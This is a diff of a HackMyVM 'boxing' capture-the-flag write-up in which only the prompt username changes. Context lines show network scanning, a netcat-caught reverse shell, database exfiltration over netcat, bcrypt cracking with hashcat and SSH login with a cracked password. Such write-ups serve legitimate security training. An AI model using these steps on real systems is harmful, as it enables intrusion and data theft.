@@ -4,14 +4,14 @@
 ### ARP Scan
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ sudo arp-scan -l | grep b6
+garffff@garffff:~/hackmyvm/boxing$ sudo arp-scan -l | grep b6
 192.168.0.112	08:00:27:22:13:b6	PCS Systemtechnik GmbH
 ```
 
 ### Nmap Scan
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ sudo nmap -p- -sV -sC 192.168.0.112 -oA nmap/boxing.tcp
+garffff@garffff:~/hackmyvm/boxing$ sudo nmap -p- -sV -sC 192.168.0.112 -oA nmap/boxing.tcp
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-02 11:35 GMT
 Nmap scan report for staging-env.boxing.hmv (192.168.0.112)
 Host is up (0.000051s latency).
@@ -89,8 +89,8 @@ Using the input boxes POST request did not give me any results. However, using `
 The output in the response looks like `pidstat` command was used. As an example, this is my output from that command on my local system:
 
 ```bash
-gareth@gareth:~/Downloads$ pidstat
-Linux 5.15.0-124-generic (gareth) 	02/11/24 	_x86_64_	(8 CPU)
+garffff@garffff:~/Downloads$ pidstat
+Linux 5.15.0-124-generic (garffff) 	02/11/24 	_x86_64_	(8 CPU)
 
 12:19:45      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
 12:19:45        0         1    0.07    0.06    0.00    0.00    0.12     1  systemd
@@ -132,7 +132,7 @@ processName=
 Gives me a shell:
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ sudo nc -lvp 443
+garffff@garffff:~/hackmyvm/boxing$ sudo nc -lvp 443
 Listening on 0.0.0.0 443
 Connection received on staging-env.boxing.hmv 55862
 whoami && id
@@ -146,7 +146,7 @@ Upgraded TTY line:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@boxing:/opt/pidstat$ ^Z
 [1]+  Stopped                 sudo nc -lvp 443
-gareth@gareth:~/hackmyvm/boxing$ stty raw -echo
+garffff@garffff:~/hackmyvm/boxing$ stty raw -echo
 sudo nc -lvp 443hackmyvm/boxing$ 
 
 
@@ -181,12 +181,12 @@ d3c4cf79912605f146b3a0137c60ac3c  boxing_database.db
 Host:
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ sudo nc -lvp 9999 > boxing_database.db
-[sudo] password for gareth:            
+garffff@garffff:~/hackmyvm/boxing$ sudo nc -lvp 9999 > boxing_database.db
+[sudo] password for garffff:            
 Listening on 0.0.0.0 9999
 Connection received on staging-env.boxing.hmv 33362
 ^C
-gareth@gareth:~/hackmyvm/boxing$ md5sum boxing_database.db
+garffff@garffff:~/hackmyvm/boxing$ md5sum boxing_database.db
 d3c4cf79912605f146b3a0137c60ac3c  boxing_database.db
 ```
 
@@ -240,8 +240,8 @@ Hello!+You+don't+have+a+link+to+reset+the+password,+and+I've+forgotten+it!+I+tri
 So we know that their password used to be `Cassius!`. 
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ echo 'Cassius!' > password.txt
-gareth@gareth:~/hackmyvm/boxing$ hashcat -m 3200 hash.txt password.txt  -r /opt/OneRuleToRuleThemStill.rule 
+garffff@garffff:~/hackmyvm/boxing$ echo 'Cassius!' > password.txt
+garffff@garffff:~/hackmyvm/boxing$ hashcat -m 3200 hash.txt password.txt  -r /opt/OneRuleToRuleThemStill.rule 
 hashcat (v6.2.6-707-g91095845b) starting
 
 Successfully initialized the NVIDIA main driver CUDA runtime library.
@@ -289,7 +289,7 @@ ssh cassius@192.168.0.112:Cassius!123
 So now we should be able to ssh into that user and grab the first flag:
 
 ```bash
-gareth@gareth:~/hackmyvm/boxing$ ssh cassius@192.168.0.112
+garffff@garffff:~/hackmyvm/boxing$ ssh cassius@192.168.0.112
 The authenticity of host '192.168.0.112 (192.168.0.112)' can't be established.
 ED25519 key fingerprint is SHA256:wQ4AA13WzS+DnZ3CX93jGyXamANQ1waSb5GMik3XS1k.
 This key is not known by any other names
